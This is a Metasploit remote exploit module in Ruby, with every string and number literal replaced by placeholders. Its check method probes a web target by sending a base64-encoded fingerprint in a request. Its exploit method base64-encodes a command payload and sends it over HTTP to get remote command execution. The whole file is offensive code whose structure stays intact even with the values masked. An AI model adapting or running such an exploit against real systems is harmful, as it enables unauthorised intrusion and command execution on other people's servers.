require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = ExcellentRanking include Msf :: Exploit :: Remote :: HttpClient def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > MSF_LICENSE , <str> = > [ <str> , <str> ] , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] ] , <str> = > { <str> = > <str> , <str> = > { <str> = > <str> , <str> = > <str> , } } , <str> = > { <str> = > <str> } , <str> = > <str> , <str> = > ARCH_CMD , <str> = > [ [ <str> , { <str> = > true } ] ] , <str> = > false , <str> = > <str> , <str> = > <int> ) ) register_options ( [ OptString . new ( <str> , [ true , <str> , <str> ] ) , ] , self . class ) end def check base = target_uri . path base << <str> if base [ - <int> , <int> ] != <str> peer = <str> rhost <str> rport <str> fingerprint = Rex :: Text . rand_text_alphanumeric ( rand ( <int> ) + <int> ) code = Rex :: Text . uri_encode ( Rex :: Text . encode_base64 ( <str> fingerprint <str> ) ) rand_key_value = rand_text_alphanumeric ( rand ( <int> ) + <int> ) print_status ( <str> ) begin res = send_request_cgi ( { <str> = > <str> , <str> = > <str> base <str> code <str> rand_key_value <str> } ) if res and res . body =~ <str> fingerprint <str> return Exploit :: CheckCode :: Vulnerable end rescue :: Rex :: ConnectionRefused , :: Rex :: HostUnreachable , :: Rex :: ConnectionTimeout vprint_error ( <str> ) return Exploit :: CheckCode :: Unknown end return Exploit :: CheckCode :: Safe end def exploit base = target_uri . path base << <str> if base [ - <int> , <int> ] != <str> code = Rex :: Text . uri_encode ( Rex :: Text . encode_base64 ( payload . encoded + <str> ) ) rand_key_value = rand_text_alphanumeric ( rand ( <int> ) + <int> ) print_status ( <str> code . length <str> ) begin res = send_request_cgi ( { <str> = > <str> , <str> = > <str> base <str> code <str> rand_key_value <str> } ) if res and res . code == <int> print_good ( <str> ) else fail_with ( Failure :: UnexpectedReply , <str> peer <str> ) end rescue :: Rex :: ConnectionRefused , :: Rex :: HostUnreachable , :: Rex :: ConnectionTimeout fail_with ( Failure :: Unreachable , <str> peer <str> ) end end end 
